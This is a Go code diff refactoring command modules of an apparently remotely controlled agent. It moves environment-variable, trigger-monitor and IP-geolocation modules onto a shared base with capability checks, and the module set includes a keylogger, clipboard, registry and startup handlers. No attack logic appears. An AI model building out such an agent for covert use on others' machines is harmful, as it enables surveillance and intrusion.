@@ -537,12 +537,9 @@ var (
 
 func newClipboardModule() *clipboardModule           { return &clipboardModule{} }
 func newFileManagerModule() *fileManagerModule       { return &fileManagerModule{} }
-func newEnvironmentModule() *environmentModule       { return &environmentModule{} }
 func newTaskManagerModule() *taskManagerModule       { return &taskManagerModule{} }
 func newTCPConnectionsModule() *tcpConnectionsModule { return &tcpConnectionsModule{} }
 func newClientChatModule() *clientChatModule         { return &clientChatModule{} }
-func newTriggerMonitorModule() *triggerMonitorModule { return &triggerMonitorModule{} }
-func newGeoModule() *geoModule                       { return &geoModule{} }
 func newSystemInfoModule() *systemInfoModule         { return &systemInfoModule{} }
 
 type keyloggerModule struct {
@@ -1081,23 +1078,262 @@ func (m *fileManagerModule) Shutdown(context.Context) error {
 	return nil
 }
 
+type environmentModule struct {
+	BaseModule
+	manager *environmentmgr.Manager
+}
+
+func newEnvironmentModule() *environmentModule {
+	return &environmentModule{
+		BaseModule: *NewBaseModule("environment-variables", environmentModuleBaseCapabilities),
+	}
+}
+
+type environmentCommandPayload struct {
+	Action string `json:"action"`
+}
+
+func (m *environmentModule) Metadata() ModuleMetadata {
+	return ModuleMetadata{
+		ID:          "environment-variables",
+		Title:       "Environment Variables",
+		Description: "List and modify environment variables on the host system.",
+		Commands:    []string{"environment-variables"},
+		Capabilities: []ModuleCapability{
+			{
+				ID:          "environment.inspect",
+				Name:        "environment.inspect",
+				Description: "Enumerate current environment variables.",
+			},
+			{
+				ID:          "environment.modify",
+				Name:        "environment.modify",
+				Description: "Create, update, or remove environment variables.",
+			},
+		},
+	}
+}
+
+func (m *environmentModule) Init(ctx context.Context, cfg Config) error {
+	m.BaseModule.Init(ctx, cfg)
+	return m.configure(cfg)
+}
+
+func (m *environmentModule) UpdateConfig(cfg Config) error {
+	m.BaseModule.UpdateConfig(cfg)
+	return m.configure(cfg)
+}
+
+func (m *environmentModule) configure(Config) error {
+	if m.manager == nil {
+		m.manager = environmentmgr.NewManager()
+	}
+	return nil
+}
+
+func (m *environmentModule) Handle(ctx context.Context, cmd protocol.Command) error {
+	if m.manager == nil {
+		return WrapCommandResult(protocol.CommandResult{
+			CommandID:   cmd.ID,
+			Success:     false,
+			Error:       "environment subsystem not initialized",
+			CompletedAt: time.Now().UTC().Format(time.RFC3339Nano),
+		})
+	}
+	if len(cmd.Payload) > 0 {
+		var payload environmentCommandPayload
+		if err := json.Unmarshal(cmd.Payload, &payload); err == nil {
+			action := strings.TrimSpace(strings.ToLower(payload.Action))
+			switch action {
+			case "list", "":
+				if err := m.HandleCapabilityCheck(cmd, "environment.inspect"); err != nil {
+					return err
+				}
+			case "set", "remove":
+				if err := m.HandleCapabilityCheck(cmd, "environment.modify"); err != nil {
+					return err
+				}
+			}
+		}
+	}
+	return WrapCommandResult(m.manager.HandleCommand(ctx, cmd))
+}
+
+func (m *environmentModule) Shutdown(context.Context) error { return nil }
+
+type triggerMonitorModule struct {
+	BaseModule
+	manager *triggermgr.Manager
+}
+
+func newTriggerMonitorModule() *triggerMonitorModule {
+	return &triggerMonitorModule{
+		BaseModule: *NewBaseModule("trigger-monitor", triggerMonitorModuleBaseCapabilities),
+	}
+}
+
+type triggerCommandPayload struct {
+	Action string `json:"action"`
+}
+
+func (m *triggerMonitorModule) Metadata() ModuleMetadata {
+	return ModuleMetadata{
+		ID:          "trigger-monitor",
+		Title:       "Trigger Monitor",
+		Description: "Configure trigger telemetry collection cadence and content.",
+		Commands:    []string{"trigger-monitor"},
+		Capabilities: []ModuleCapability{
+			{
+				ID:          "trigger-monitor.observe",
+				Name:        "trigger-monitor.observe",
+				Description: "Retrieve trigger monitor status and metrics.",
+			},
+			{
+				ID:          "trigger-monitor.configure",
+				Name:        "trigger-monitor.configure",
+				Description: "Update trigger monitor feed and collection parameters.",
+			},
+		},
+	}
+}
+
+func (m *triggerMonitorModule) Init(ctx context.Context, cfg Config) error {
+	m.BaseModule.Init(ctx, cfg)
+	return m.configure(cfg)
+}
+
+func (m *triggerMonitorModule) UpdateConfig(cfg Config) error {
+	m.BaseModule.UpdateConfig(cfg)
+	return m.configure(cfg)
+}
+
+func (m *triggerMonitorModule) configure(Config) error {
+	if m.manager == nil {
+		m.manager = triggermgr.NewManager()
+	}
+	return nil
+}
+
+func (m *triggerMonitorModule) Handle(ctx context.Context, cmd protocol.Command) error {
+	if m.manager == nil {
+		return WrapCommandResult(protocol.CommandResult{
+			CommandID:   cmd.ID,
+			Success:     false,
+			Error:       "trigger monitor subsystem not initialized",
+			CompletedAt: time.Now().UTC().Format(time.RFC3339Nano),
+		})
+	}
+	if len(cmd.Payload) > 0 {
+		var payload triggerCommandPayload
+		if err := json.Unmarshal(cmd.Payload, &payload); err == nil {
+			action := strings.TrimSpace(strings.ToLower(payload.Action))
+			switch action {
+			case "status", "":
+				if err := m.HandleCapabilityCheck(cmd, "trigger-monitor.observe"); err != nil {
+					return err
+				}
+			case "configure":
+				if err := m.HandleCapabilityCheck(cmd, "trigger-monitor.configure"); err != nil {
+					return err
+				}
+			}
+		}
+	}
+	return WrapCommandResult(m.manager.HandleCommand(ctx, cmd))
+}
+
+func (m *triggerMonitorModule) Shutdown(context.Context) error { return nil }
+
+type geoModule struct {
+	BaseModule
+	manager *geolocationmgr.Manager
+}
+
+func newGeoModule() *geoModule {
+	return &geoModule{
+		BaseModule: *NewBaseModule("ip-geolocation", geoModuleBaseCapabilities),
+	}
+}
+
+type geoCommandPayload struct {
+	Action string `json:"action"`
+}
+
+func (m *geoModule) Metadata() ModuleMetadata {
+	return ModuleMetadata{
+		ID:          "ip-geolocation",
+		Title:       "IP Geolocation",
+		Description: "Resolve IP addresses to synthetic geographic metadata.",
+		Commands:    []string{"ip-geolocation"},
+		Capabilities: []ModuleCapability{
+			{
+				ID:          "ip-geolocation.lookup",
+				Name:        "ip-geolocation.lookup",
+				Description: "Perform IP geolocation lookups via configured providers.",
+			},
+			{
+				ID:          "ip-geolocation.providers",
+				Name:        "ip-geolocation.providers",
+				Description: "Enumerate supported geolocation providers and defaults.",
+			},
+		},
+	}
+}
+
+func (m *geoModule) Init(ctx context.Context, cfg Config) error {
+	m.BaseModule.Init(ctx, cfg)
+	return m.configure(cfg)
+}
+
+func (m *geoModule) UpdateConfig(cfg Config) error {
+	m.BaseModule.UpdateConfig(cfg)
+	return m.configure(cfg)
+}
+
+func (m *geoModule) configure(cfg Config) error {
+	if m.manager == nil {
+		m.manager = geolocationmgr.NewManager(cfg.Geolocation, cfg.HTTPClient, cfg.BaseURL, cfg.AuthKey)
+		return nil
+	}
+	m.manager.ApplyConfig(cfg.Geolocation, cfg.HTTPClient, cfg.BaseURL, cfg.AuthKey)
+	return nil
+}
+
+func (m *geoModule) Handle(ctx context.Context, cmd protocol.Command) error {
+	if m.manager == nil {
+		return WrapCommandResult(protocol.CommandResult{
+			CommandID:   cmd.ID,
+			Success:     false,
+			Error:       "geolocation subsystem not initialized",
+			CompletedAt: time.Now().UTC().Format(time.RFC3339Nano),
+		})
+	}
+	if len(cmd.Payload) > 0 {
+		var payload geoCommandPayload
+		if err := json.Unmarshal(cmd.Payload, &payload); err == nil {
+			action := strings.TrimSpace(strings.ToLower(payload.Action))
+			switch action {
+			case "lookup", "":
+				if err := m.HandleCapabilityCheck(cmd, "ip-geolocation.lookup"); err != nil {
+					return err
+				}
+			case "providers", "status":
+				if err := m.HandleCapabilityCheck(cmd, "ip-geolocation.providers"); err != nil {
+					return err
+				}
+			}
+		}
+	}
+	return WrapCommandResult(m.manager.HandleCommand(ctx, cmd))
+}
+
+func (m *geoModule) Shutdown(context.Context) error { return nil }
+
 type registryModule struct {
 	manager *registrymgr.Manager
 }
 
-type environmentModule struct {
-	manager *environmentmgr.Manager
-}
-
-type triggerMonitorModule struct {
-	manager *triggermgr.Manager
-}
-
-type geoModule struct {
-	manager *geolocationmgr.Manager
-}
-
-func newRegistryModule() Module {
+func newRegistryModule() *registryModule {
 	return &registryModule{}
 }
 
@@ -1130,166 +1366,6 @@ func registryModuleCapabilities() []ModuleCapability {
 	}
 	return capabilities
 }
-
-func (m *environmentModule) Metadata() ModuleMetadata {
-	return ModuleMetadata{
-		ID:          "environment-variables",
-		Title:       "Environment Variables",
-		Description: "List and modify environment variables on the host system.",
-		Commands:    []string{"environment-variables"},
-		Capabilities: []ModuleCapability{
-			{
-				ID:          "environment.inspect",
-				Name:        "environment.inspect",
-				Description: "Enumerate current environment variables.",
-			},
-			{
-				ID:          "environment.modify",
-				Name:        "environment.modify",
-				Description: "Create, update, or remove environment variables.",
-			},
-		},
-	}
-}
-
-func (m *environmentModule) ID() string {
-	return "environment-variables"
-}
-
-func (m *environmentModule) Init(_ context.Context, cfg Config) error {
-	return m.configure(cfg)
-}
-
-func (m *environmentModule) UpdateConfig(cfg Config) error {
-	return m.configure(cfg)
-}
-
-func (m *environmentModule) configure(Config) error {
-	if m.manager == nil {
-		m.manager = environmentmgr.NewManager()
-	}
-	return nil
-}
-
-func (m *environmentModule) Handle(ctx context.Context, cmd protocol.Command) error {
-	if m.manager == nil {
-		return WrapCommandResult(protocol.CommandResult{
-			CommandID:   cmd.ID,
-			Success:     false,
-			Error:       "environment subsystem not initialized",
-			CompletedAt: time.Now().UTC().Format(time.RFC3339Nano),
-		})
-	}
-	return WrapCommandResult(m.manager.HandleCommand(ctx, cmd))
-}
-
-func (m *environmentModule) Shutdown(context.Context) error { return nil }
-
-func (m *triggerMonitorModule) Metadata() ModuleMetadata {
-	return ModuleMetadata{
-		ID:          "trigger-monitor",
-		Title:       "Trigger Monitor",
-		Description: "Configure trigger telemetry collection cadence and content.",
-		Commands:    []string{"trigger-monitor"},
-		Capabilities: []ModuleCapability{
-			{
-				ID:          "trigger-monitor.observe",
-				Name:        "trigger-monitor.observe",
-				Description: "Retrieve trigger monitor status and metrics.",
-			},
-			{
-				ID:          "trigger-monitor.configure",
-				Name:        "trigger-monitor.configure",
-				Description: "Update trigger monitor feed and collection parameters.",
-			},
-		},
-	}
-}
-
-func (m *triggerMonitorModule) ID() string { return "trigger-monitor" }
-
-func (m *triggerMonitorModule) Init(_ context.Context, cfg Config) error {
-	return m.configure(cfg)
-}
-
-func (m *triggerMonitorModule) UpdateConfig(cfg Config) error {
-	return m.configure(cfg)
-}
-
-func (m *triggerMonitorModule) configure(Config) error {
-	if m.manager == nil {
-		m.manager = triggermgr.NewManager()
-	}
-	return nil
-}
-
-func (m *triggerMonitorModule) Handle(ctx context.Context, cmd protocol.Command) error {
-	if m.manager == nil {
-		return WrapCommandResult(protocol.CommandResult{
-			CommandID:   cmd.ID,
-			Success:     false,
-			Error:       "trigger monitor subsystem not initialized",
-			CompletedAt: time.Now().UTC().Format(time.RFC3339Nano),
-		})
-	}
-	return WrapCommandResult(m.manager.HandleCommand(ctx, cmd))
-}
-
-func (m *triggerMonitorModule) Shutdown(context.Context) error { return nil }
-
-func (m *geoModule) Metadata() ModuleMetadata {
-	return ModuleMetadata{
-		ID:          "ip-geolocation",
-		Title:       "IP Geolocation",
-		Description: "Resolve IP addresses to synthetic geographic metadata.",
-		Commands:    []string{"ip-geolocation"},
-		Capabilities: []ModuleCapability{
-			{
-				ID:          "ip-geolocation.lookup",
-				Name:        "ip-geolocation.lookup",
-				Description: "Perform IP geolocation lookups via configured providers.",
-			},
-			{
-				ID:          "ip-geolocation.providers",
-				Name:        "ip-geolocation.providers",
-				Description: "Enumerate supported geolocation providers and defaults.",
-			},
-		},
-	}
-}
-
-func (m *geoModule) ID() string { return "ip-geolocation" }
-
-func (m *geoModule) Init(_ context.Context, cfg Config) error {
-	return m.configure(cfg)
-}
-
-func (m *geoModule) UpdateConfig(cfg Config) error {
-	return m.configure(cfg)
-}
-
-func (m *geoModule) configure(cfg Config) error {
-	if m.manager == nil {
-		m.manager = geolocationmgr.NewManager(cfg.Geolocation)
-		return nil
-	}
-	m.manager.ApplyConfig(cfg.Geolocation)
-	return nil
-}
-
-func (m *geoModule) Handle(ctx context.Context, cmd protocol.Command) error {
-	if m.manager == nil {
-		return WrapCommandResult(protocol.CommandResult{
-			CommandID:   cmd.ID,
-			Success:     false,
-			Error:       "geolocation subsystem not initialized",
-			CompletedAt: time.Now().UTC().Format(time.RFC3339Nano),
-		})
-	}
-	return WrapCommandResult(m.manager.HandleCommand(ctx, cmd))
-}
-
-func (m *geoModule) Shutdown(context.Context) error { return nil }
 
 func (m *registryModule) ID() string {
 	return "registry"
@@ -1332,7 +1408,7 @@ type startupModule struct {
 	manager *startupmgr.Manager
 }
 
-func newStartupModule() Module {
+func newStartupModule() *startupModule {
 	return &startupModule{}
 }
 
